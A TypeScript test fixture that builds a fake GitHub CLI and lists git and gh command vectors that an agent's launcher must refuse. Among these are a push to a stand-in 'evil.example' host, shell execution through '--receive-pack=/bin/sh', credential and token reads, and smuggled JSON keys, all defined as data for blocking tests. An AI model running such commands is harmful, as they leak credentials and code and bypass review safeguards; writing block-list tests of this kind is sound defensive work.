import type { GhProcess } from '../../src/process/gh.js'
import type { GhRoute } from '../../src/process/gh.js'
import {
  answer,
  approve,
  initialState,
  pushed,
  type FakeRepository,
  type FakeRuleset,
  type FakeState,
} from '../../tools/fake-gh.js'

/**
 * The fake gh of `tools/fake-gh.ts` as the process a test hands the launcher
 * (`ghIn({ run })`, and `MainDeps.gh` from stage 6's next steps), and the
 * doors: every git and gh command stage 6 brief § 6 says idp-agent never
 * runs, as the argument vectors a launcher would hand a process, and the words
 * the source may not spell. With `tests/live/`, this is the one file of
 * `tests/` the door rule lets name a door (`tests/architecture/`): every other
 * test takes them from here, and its titles from `door.name`.
 *
 * It imports nothing from src/ but the `GhProcess` type: the fake reads each
 * vector with its own patterns, so a drift from the launcher's grammar fails.
 * The doors are spelled here, not built with the launchers' constants: a door
 * must stay a door whatever a launcher's grammar comes to say.
 */

/**
 * The version the fake gh says it is: `GH_MINIMUM_VERSION`, the oldest gh a
 * committed live run used (`tests/contract/github-answers.test.ts` holds the
 * two together; 2.96.0 on 2026-10-02).
 */
export const FAKE_GH_VERSION = '2.96.0'

/** What a test changes of the default world: gh 2.96.0, installed, `ada` (a person), logged in as her. */
export type FakeModel = Partial<FakeState>

/** One call the fake received, as the launcher handed it. */
export interface Sent {
  readonly argv: readonly string[]
  readonly stdin: Buffer | undefined
  readonly env: NodeJS.ProcessEnv
}

export interface FakeGitHub {
  /** The process to hand `ghIn({ run })`. */
  readonly process: GhProcess
  /** gh logged in as `login`, an account of the model. */
  as(login: string): void
  /** gh logged out: `gh api` exits 4. */
  logout(): void
  readonly state: FakeState
  /** Every call received: the vector, stdin, and the environment gh would have run in. */
  readonly sent: readonly Sent[]
  /** A review approving pull request `number` by `login`, at its head's current commit. */
  approve(number: number, login: string): void
  /**
   * A git push of `commit` to `ref` by `actor`, judged by the model's rules,
   * its objects already in the bare repository: 200, or 409 refused.
   */
  pushAs(actor: { readonly type: 'User'; readonly login: string } | { readonly type: 'DeployKey'; readonly id: number }, ref: string, commit: string): number
  /**
   * The next `times` calls of `route` answered `status`, or `lost` (exit 1,
   * nothing on stdout); `made`, the call carried out first and its answer
   * replaced — by default for `lost`, never for a status.
   */
  fault(fault: { readonly route: GhRoute['route'] | 'open-pull-request'; readonly status: number | 'lost'; readonly times: number; readonly made?: boolean }): void
}

export function fakeGitHub(model: FakeModel = {}): FakeGitHub {
  const state: FakeState = { ...initialState(), version: FAKE_GH_VERSION, ...model }
  const sent: Sent[] = []
  return {
    process: async (argv, options) => {
      sent.push({ argv: [...argv], stdin: options.stdin, env: { ...options.env } })
      return answer(state, argv, options.stdin)
    },
    as: (login) => {
      if (!state.accounts.some((account) => account.login === login)) {
        throw new Error(`the fake GitHub has no account ${login}`)
      }
      state.session = { login }
    },
    logout: () => {
      state.session = undefined
    },
    state,
    sent,
    approve: (number, login) => approve(state, number, login),
    pushAs: (actor, ref, commit) => pushed(state, actor, ref, commit),
    fault: (fault) => {
      state.faults = [...(state.faults ?? []), { ...fault }]
    },
  }
}

// ---------------------------------------------------------------- the model

/**
 * `acme/iac` as `change` leaves it: not archived, `ada` holding push and no
 * more, `main` there and not protected, no ruleset, no bare repository.
 */
export function repository(change: Partial<FakeRepository> = {}): FakeRepository {
  return {
    owner: 'acme',
    name: 'iac',
    archived: false,
    permissions: { ada: { admin: false, maintain: false, push: true } },
    branches: { main: { protected: false } },
    rulesets: [],
    ...change,
  }
}

/**
 * The ruleset `docs/submitting.md` asks for, on `branches`: a pull request
 * of 1 approval with the most recent push's approval, force pushes blocked,
 * deletions restricted, nobody in the bypass list, active.
 */
export function protectingRuleset(id = 1, change: Partial<FakeRuleset> = {}): FakeRuleset {
  return {
    id,
    enforcement: 'active',
    branches: ['main'],
    rules: [
      {
        type: 'pull_request',
        parameters: {
          required_approving_review_count: 1,
          dismiss_stale_reviews_on_push: false,
          require_code_owner_review: false,
          require_last_push_approval: true,
          required_review_thread_resolution: false,
        },
      },
      { type: 'non_fast_forward' },
      { type: 'deletion' },
    ],
    bypass: [],
    ...change,
  }
}

/**
 * `acme/iac` with its `main` protected as `docs/submitting.md` says, and
 * `ada` its administrator — as the owner is of the throwaway repository —
 * so the bypass list is hers to read.
 */
export function protectedMain(change: Partial<FakeRepository> = {}): FakeRepository {
  return repository({
    permissions: { ada: { admin: true, maintain: false, push: true } },
    rulesets: [protectingRuleset()],
    ...change,
  })
}

/** A vector a launcher must refuse before a process starts. */
export interface Door {
  readonly name: string
  readonly argv: readonly string[]
  /** What the vector would be handed on stdin. */
  readonly stdin?: string
}

// ---------------------------------------------------------------- git

/** `process/git.ts`'s HARDENING, spelled again. */
const HARDENING = [
  '--no-pager',
  '-c',
  'core.hooksPath=/dev/null',
  '-c',
  'core.fsmonitor=false',
  '-c',
  'core.untrackedCache=false',
  '-c',
  'user.useConfigOnly=true',
]
/** The push's own pins and flags (§ 4), spelled again. */
const PINS = [
  '-c',
  'protocol.ext.allow=never',
  '-c',
  'protocol.file.allow=never',
  '-c',
  'http.followRedirects=false',
  '-c',
  'push.followTags=false',
  '-c',
  'push.recurseSubmodules=no',
  '-c',
  'push.gpgSign=false',
]
const FLAGS = ['--porcelain', '--no-verify', '--no-follow-tags', '--no-recurse-submodules', '--no-signed']
const REPO = '/work/iac'
const SHA = '0123456789abcdef0123456789abcdef01234567'
const BRANCH = 'idp-agent/x-0123abcd'
const REF = `refs/heads/${BRANCH}`
const LEASE = `--force-with-lease=${REF}:`
const URL = 'git@github.com:acme/iac.git'
const REFSPEC = `${SHA}:${REF}`

/** The one push form, with `options` after the flags and `rest` in place of the lease, URL and refspec. */
const push = (options: readonly string[], rest: readonly string[] = [LEASE, URL, REFSPEC]): string[] => [
  ...HARDENING,
  ...PINS,
  '-C',
  REPO,
  'push',
  ...FLAGS,
  ...options,
  ...rest,
]
/** A command in a repository, after HARDENING and `-C`. */
const inRepo = (...args: string[]): string[] => [...HARDENING, '-C', REPO, ...args]

export const GIT_DOORS: readonly Door[] = [
  { name: 'git push --force', argv: push(['--force']) },
  { name: 'git push -f', argv: push(['-f']) },
  { name: 'git push +<sha>:<ref>', argv: push([], [LEASE, URL, `+${REFSPEC}`]) },
  { name: 'git push --delete', argv: push(['--delete']) },
  { name: 'git push -d', argv: push(['-d']) },
  { name: 'git push --mirror', argv: push(['--mirror'], [LEASE, URL]) },
  { name: 'git push --all', argv: push(['--all'], [LEASE, URL]) },
  { name: 'git push --tags', argv: push(['--tags']) },
  { name: 'git push --prune', argv: push(['--prune']) },
  { name: 'git push --follow-tags', argv: push(['--follow-tags']) },
  { name: 'git push --set-upstream', argv: push(['--set-upstream']) },
  { name: 'git push with a second refspec', argv: push([], [LEASE, URL, REFSPEC, `${SHA}:refs/heads/main`]) },
  { name: "git push to a remote's name", argv: push([], [LEASE, 'origin', REFSPEC]) },
  { name: 'git push to a ref outside idp-agent/', argv: push([], ['--force-with-lease=refs/heads/main:', URL, `${SHA}:refs/heads/main`]) },
  { name: 'git push with a lease naming another ref', argv: push([], ['--force-with-lease=refs/heads/idp-agent/y-0123abcd:', URL, REFSPEC]) },
  { name: 'git push with a lease holding a value', argv: push([], [`${LEASE}${SHA}`, URL, REFSPEC]) },
  { name: 'git push with no lease', argv: push([], [URL, REFSPEC]) },
  { name: 'git push to another host', argv: push([], [LEASE, 'git@evil.example:acme/iac.git', REFSPEC]) },
  { name: 'git push to a URL with userinfo', argv: push([], [LEASE, 'https://x:y@github.com/acme/iac.git', REFSPEC]) },
  { name: 'git push to a URL beginning with -', argv: push([], [LEASE, '-uhttps://github.com/acme/iac', REFSPEC]) },
  { name: 'git push --receive-pack=…', argv: push(['--receive-pack=/bin/sh']) },
  { name: 'git push --exec=…', argv: push(['--exec=/bin/sh']) },
  { name: 'git push -o …', argv: push(['-o', 'ci.skip']) },
  { name: 'git push --repo=…', argv: push(['--repo=origin']) },
  {
    name: 'git push with a pin missing',
    argv: [...HARDENING, ...PINS.slice(2), '-C', REPO, 'push', ...FLAGS, LEASE, URL, REFSPEC],
  },
  {
    name: 'git push with a flag missing',
    argv: [...HARDENING, ...PINS, '-C', REPO, 'push', ...FLAGS.slice(1), LEASE, URL, REFSPEC],
  },
  { name: 'git fetch', argv: inRepo('fetch') },
  { name: 'git pull', argv: inRepo('pull') },
  { name: 'git clone', argv: inRepo('clone', URL, '/tmp/clone') },
  { name: 'git merge', argv: inRepo('merge', SHA) },
  { name: 'git rebase', argv: inRepo('rebase', SHA) },
  { name: 'git reset --hard', argv: inRepo('reset', '--hard', SHA) },
  { name: 'git checkout', argv: inRepo('checkout', 'main') },
  { name: 'git branch -D', argv: inRepo('branch', '-D', BRANCH) },
  { name: 'git tag', argv: inRepo('tag', 'v1', SHA) },
  { name: 'git update-ref -d', argv: inRepo('update-ref', '-d', REF) },
  {
    name: 'git update-ref without its empty old value',
    argv: inRepo('update-ref', '--no-deref', '-m', 'idp-agent: submitted for review', REF, SHA),
  },
  {
    name: 'git update-ref of refs/heads/main',
    argv: inRepo('update-ref', '--no-deref', '-m', 'idp-agent: submitted for review', 'refs/heads/main', SHA, ''),
  },
  { name: 'git credential fill', argv: inRepo('credential', 'fill') },
  { name: 'git config user.name x', argv: inRepo('config', 'user.name', 'x') },
  { name: 'git config --unset …', argv: inRepo('config', '--unset', 'user.name') },
  { name: 'git config --get credential.helper', argv: inRepo('config', '--get', 'credential.helper') },
  { name: 'git remote add', argv: inRepo('remote', 'add', 'evil', URL) },
  { name: 'git remote get-url origin, with no --', argv: inRepo('remote', 'get-url', '--all', 'origin') },
  { name: 'git remote get-url of a remote called --push', argv: inRepo('remote', 'get-url', '--all', '--', '--push') },
  {
    name: 'git with an extra -c core.hooksPath',
    argv: [...HARDENING, '-c', 'core.hooksPath=/tmp/h', '-C', REPO, 'rev-parse', '--is-inside-work-tree'],
  },
  {
    name: 'git with a HARDENING element missing',
    argv: [...HARDENING.slice(0, 1), ...HARDENING.slice(3), '-C', REPO, 'rev-parse', '--is-inside-work-tree'],
  },
  {
    name: 'git --git-dir=…',
    argv: [...HARDENING, '--git-dir=/elsewhere/.git', '-C', REPO, 'rev-parse', '--is-inside-work-tree'],
  },
  { name: 'git -C a relative path', argv: [...HARDENING, '-C', 'work/iac', 'rev-parse', '--is-inside-work-tree'] },
  { name: 'git symbolic-ref HEAD refs/heads/x, a write', argv: inRepo('symbolic-ref', 'HEAD', 'refs/heads/x') },
]

// ---------------------------------------------------------------- gh

const api = (method: string, route: string, ...rest: string[]): string[] => [
  'api',
  '--hostname',
  'github.com',
  '--method',
  method,
  '--include',
  route,
  ...rest,
]
const get = (route: string, ...rest: string[]): string[] => api('GET', route, ...rest)
const PULLS = 'repos/acme/iac/pulls'
/** The open pull requests into `main`, newest first, as the in-flight read asks, before its page. */
const OPEN = 'state=open&base=main&sort=created&direction=desc&per_page=100'
/** The one POST's body, as the engine writes it, with `change` applied. */
const pullBody = (change: Record<string, unknown>): string =>
  JSON.stringify({
    title: 'idp-agent: a change',
    head: BRANCH,
    base: 'main',
    body: 'what was requested',
    draft: false,
    maintainer_can_modify: false,
    ...change,
  })

export const DOORS: readonly Door[] = [
  { name: 'gh pr merge --merge', argv: ['pr', 'merge', '1', '--merge'] },
  { name: 'gh pr merge --squash', argv: ['pr', 'merge', '1', '--squash'] },
  { name: 'gh pr merge --rebase', argv: ['pr', 'merge', '1', '--rebase'] },
  { name: 'gh pr merge --admin', argv: ['pr', 'merge', '1', '--merge', '--admin'] },
  { name: 'gh pr review --approve', argv: ['pr', 'review', '1', '--approve'] },
  { name: 'gh pr close', argv: ['pr', 'close', '1'] },
  { name: 'gh pr create', argv: ['pr', 'create', '--fill'] },
  { name: 'gh auth token', argv: ['auth', 'token'] },
  { name: 'gh auth status', argv: ['auth', 'status'] },
  { name: 'gh repo view', argv: ['repo', 'view', 'acme/iac'] },
  { name: 'gh ruleset list', argv: ['ruleset', 'list'] },
  { name: 'gh workflow run', argv: ['workflow', 'run', 'deploy.yml'] },
  { name: 'gh extension install', argv: ['extension', 'install', 'owner/gh-x'] },
  { name: 'gh alias set', argv: ['alias', 'set', 'm', 'pr merge'] },
  { name: 'gh browse', argv: ['browse'] },
  { name: 'gh api PUT …/pulls/1/merge', argv: api('PUT', `${PULLS}/1/merge`) },
  { name: 'gh api PUT …/pulls/1/merge-async', argv: api('PUT', `${PULLS}/1/merge-async`) },
  {
    name: 'gh api POST …/merges',
    argv: api('POST', 'repos/acme/iac/merges', '--input', '-'),
    stdin: JSON.stringify({ base: 'main', head: BRANCH }),
  },
  { name: 'gh api PUT …/contents/catalog/x.yml', argv: api('PUT', 'repos/acme/iac/contents/catalog/x.yml', '--input', '-'), stdin: '{}' },
  { name: 'gh api PATCH …/git/refs/heads/main', argv: api('PATCH', 'repos/acme/iac/git/refs/heads/main', '--input', '-'), stdin: '{}' },
  { name: 'gh api DELETE …/git/refs/heads/idp-agent/…', argv: api('DELETE', `repos/acme/iac/git/refs/heads/${BRANCH}`) },
  { name: 'gh api POST graphql', argv: api('POST', 'graphql', '--input', '-'), stdin: '{"query":"mutation{}"}' },
  { name: 'gh api POST …/pulls/1/reviews', argv: api('POST', `${PULLS}/1/reviews`, '--input', '-'), stdin: '{"event":"APPROVE"}' },
  { name: 'gh api PUT …/pulls/1/update-branch', argv: api('PUT', `${PULLS}/1/update-branch`) },
  { name: 'gh api GET with -f', argv: get('user', '-f', 'x=y') },
  { name: 'gh api GET with -F x=@file', argv: get('user', '-F', 'x=@file') },
  { name: 'gh api GET with --field', argv: get('user', '--field', 'x=y') },
  { name: 'gh api GET with --raw-field', argv: get('user', '--raw-field', 'x=y') },
  { name: 'gh api GET with --paginate', argv: get('repos/acme/iac/rulesets/1', '--paginate') },
  { name: 'gh api GET with --verbose', argv: get('user', '--verbose') },
  { name: 'gh api GET with -H', argv: get('user', '-H', 'Accept: application/vnd.github.raw') },
  { name: 'gh api GET with --cache 1h', argv: get('user', '--cache', '1h') },
  { name: 'gh api GET with --jq', argv: get('user', '--jq', '.') },
  { name: 'gh api GET with --template', argv: get('user', '--template', '{{.login}}') },
  { name: 'gh api GET with --input file', argv: get('user', '--input', 'file') },
  { name: 'gh api GET with a stdin', argv: get('user'), stdin: '{}' },
  { name: 'gh api --hostname evil.example', argv: ['api', '--hostname', 'evil.example', '--method', 'GET', '--include', 'user'] },
  {
    name: 'gh api --hostname github.com.evil.example',
    argv: ['api', '--hostname', 'github.com.evil.example', '--method', 'GET', '--include', 'user'],
  },
  { name: 'gh api GET with no --method', argv: ['api', '--hostname', 'github.com', '--include', 'user'] },
  { name: 'gh api GET with its flags in another order', argv: ['api', '--method', 'GET', '--hostname', 'github.com', '--include', 'user'] },
  { name: 'gh api GET of a path holding {owner}', argv: get('repos/{owner}/iac') },
  { name: 'gh api GET of a path holding {branch}', argv: get('repos/acme/iac/branches/{branch}') },
  // gh's other placeholders, filled from the current directory's repository
  // as the braces are.
  { name: 'gh api GET of a path holding :owner', argv: get('repos/:owner/iac') },
  { name: 'gh api GET of a path holding :repo', argv: get('repos/acme/:repo') },
  { name: 'gh api GET of a path holding :branch', argv: get('repos/acme/iac/branches/:branch') },
  { name: 'gh api GET of a path holding ..', argv: get('repos/acme/iac/git/ref/heads/../../../user') },
  { name: 'gh api GET of release%2F1', argv: get('repos/acme/iac/git/ref/heads/release%2F1') },
  { name: 'gh api GET of an owner -acme', argv: get('repos/-acme/iac') },
  { name: 'gh api GET of ruleset 0', argv: get('repos/acme/iac/rulesets/0') },
  { name: 'gh api GET of a commit of 7 hex', argv: get('repos/acme/iac/git/commits/0123abc') },
  { name: 'gh api GET of a path outside the templates', argv: get('repos/acme/iac/collaborators') },
  // What is in flight (6.3.6): two reads, matched whole, so neither bends into a door.
  { name: 'gh api GET …/pulls/1/merge', argv: get(`${PULLS}/1/merge`) },
  { name: 'gh api GET …/pulls/1/reviews', argv: get(`${PULLS}/1/reviews`) },
  { name: "gh api GET of a pull request's second page of files", argv: get(`${PULLS}/1/files?per_page=100&page=2`) },
  { name: "gh api GET of a pull request's files, no page size", argv: get(`${PULLS}/1/files`) },
  { name: "gh api GET of pull request 0's files", argv: get(`${PULLS}/0/files?per_page=100`) },
  { name: 'gh api GET of a fourth page of open pull requests', argv: get(`${PULLS}?${OPEN}&page=4`) },
  { name: 'gh api GET of page 0 of open pull requests', argv: get(`${PULLS}?${OPEN}&page=0`) },
  { name: 'gh api GET of open pull requests with no page', argv: get(`${PULLS}?${OPEN}`) },
  { name: 'gh api GET of open pull requests in no stated order', argv: get(`${PULLS}?state=open&base=main&per_page=100&page=1`) },
  {
    name: 'gh api GET of open pull requests into {branch}',
    argv: get(`${PULLS}?state=open&base=%7Bbranch%7D&sort=created&direction=desc&per_page=100&page=1`),
  },
  { name: 'gh api GET of every pull request, closed included', argv: get(`${PULLS}?state=all&base=main&sort=created&direction=desc&per_page=100&page=1`) },
  { name: 'gh api GET of open pull requests with --paginate', argv: get(`${PULLS}?${OPEN}&page=1`, '--paginate') },
  { name: "gh api GET of a pull request's files with --paginate", argv: get(`${PULLS}/1/files?per_page=100`, '--paginate') },
  {
    name: 'gh api POST pulls with head owner:branch',
    argv: api('POST', PULLS, '--input', '-'),
    stdin: pullBody({ head: `acme:${BRANCH}` }),
  },
  { name: 'gh api POST pulls with head main', argv: api('POST', PULLS, '--input', '-'), stdin: pullBody({ head: 'main' }) },
  {
    name: 'gh api POST pulls with base {branch}',
    argv: api('POST', PULLS, '--input', '-'),
    stdin: pullBody({ base: '{branch}' }),
  },
  {
    name: 'gh api POST pulls with an extra key merge_method',
    argv: api('POST', PULLS, '--input', '-'),
    stdin: pullBody({ merge_method: 'squash' }),
  },
  { name: 'gh api POST pulls as a draft', argv: api('POST', PULLS, '--input', '-'), stdin: pullBody({ draft: true }) },
  {
    name: 'gh api POST pulls that maintainers can modify',
    argv: api('POST', PULLS, '--input', '-'),
    stdin: pullBody({ maintainer_can_modify: true }),
  },
  { name: 'gh api POST pulls with no stdin', argv: api('POST', PULLS, '--input', '-') },
  // JSON.parse keeps a repeated key's last value, and another parser may keep
  // its first: the one form admitted is the one the engine writes, byte for
  // byte, so neither reading is ever asked for.
  {
    name: 'gh api POST pulls with base twice, the first another branch',
    argv: api('POST', PULLS, '--input', '-'),
    stdin: `{"base":"production",${pullBody({}).slice(1)}`,
  },
  {
    name: 'gh api POST pulls with its keys in another order',
    argv: api('POST', PULLS, '--input', '-'),
    stdin: JSON.stringify({
      base: 'main',
      head: BRANCH,
      title: 'idp-agent: a change',
      body: 'what was requested',
      draft: false,
      maintainer_can_modify: false,
    }),
  },
  {
    name: 'gh api POST pulls with white space between its keys',
    argv: api('POST', PULLS, '--input', '-'),
    stdin: pullBody({}).replaceAll(',"', ', "'),
  },
]

/** The merge of pull request #1 through the API, as the author would try it: the door § 10 names 405. */
export const MERGE_DOOR: Door = (() => {
  const found = DOORS.find((door) => door.argv[4] === 'PUT' && door.argv[6] === `${PULLS}/1/merge`)
  if (found === undefined) throw new Error('DOORS holds no merge of pull request #1')
  return found
})()

/**
 * The merge GitHub accepts and judges later, `merge-async`: GitHub answered it
 * 202 Accepted to the identity that opened the pull request, and never merged
 * it — not over the 30 s the run watched, not at the run's end (the owner's
 * live run of 2026-10-02).
 * Its 2xx is no refusal, and no merge either: what the pull request and the
 * base say after it is.
 */
export const QUEUED_MERGE_DOOR: Door = (() => {
  const found = DOORS.find((door) => door.argv[4] === 'PUT' && door.argv[6] === `${PULLS}/1/merge-async`)
  if (found === undefined) throw new Error('DOORS holds no merge-async of pull request #1')
  return found
})()

/**
 * The writes to a base the rules protect, each with the status GitHub
 * answered it to the identity that opened the pull request, an administrator
 * outside the bypass list (the owner's live run of 2026-10-02): a merge of two
 * branches into it and a file written to it, 409; its ref moved, 422.
 */
export const BASE_WRITES: readonly { readonly door: Door; readonly status: number }[] = (() => {
  const named = (method: string, address: string): Door => {
    const found = DOORS.find((door) => door.argv[4] === method && door.argv[6] === address)
    if (found === undefined) throw new Error(`DOORS holds no ${method} of ${address}`)
    return found
  }
  return [
    { door: named('POST', 'repos/acme/iac/merges'), status: 409 },
    { door: named('PUT', 'repos/acme/iac/contents/catalog/x.yml'), status: 409 },
    { door: named('PATCH', 'repos/acme/iac/git/refs/heads/main'), status: 422 },
  ]
})()

/**
 * The doors the fake's model answers — a merge, an approval, a write to a
 * base — by name; every other door is a vector idp-agent never sends.
 */
export const MODELLED_DOORS: ReadonlySet<string> = new Set([
  'gh pr merge --merge',
  'gh pr merge --squash',
  'gh pr merge --rebase',
  'gh pr merge --admin',
  'gh pr review --approve',
  'gh api PUT …/pulls/1/merge',
  'gh api PUT …/pulls/1/merge-async',
  'gh api POST …/merges',
  'gh api PUT …/contents/catalog/x.yml',
  'gh api PATCH …/git/refs/heads/main',
  'gh api POST …/pulls/1/reviews',
])

/**
 * § 6's words for the source: the direct doors (a merge, a bypass, a write
 * through the contents or the refs, GraphQL, a token read, a forced or
 * mirroring push) and the three write methods, as whole upper-case words. The
 * architecture rules import them rather than spell them, since a rule that
 * spelled them would refuse itself.
 */
export const DOOR_WORDS: readonly string[] = [
  'pr merge',
  '--admin',
  '/merge',
  'merge-async',
  '/merges',
  '/contents/',
  '/graphql',
  '/reviews',
  'update-branch',
  'auth token',
  '--mirror',
  '--delete',
  '--tags',
  '--force',
  'PUT',
  'PATCH',
  'DELETE',
]
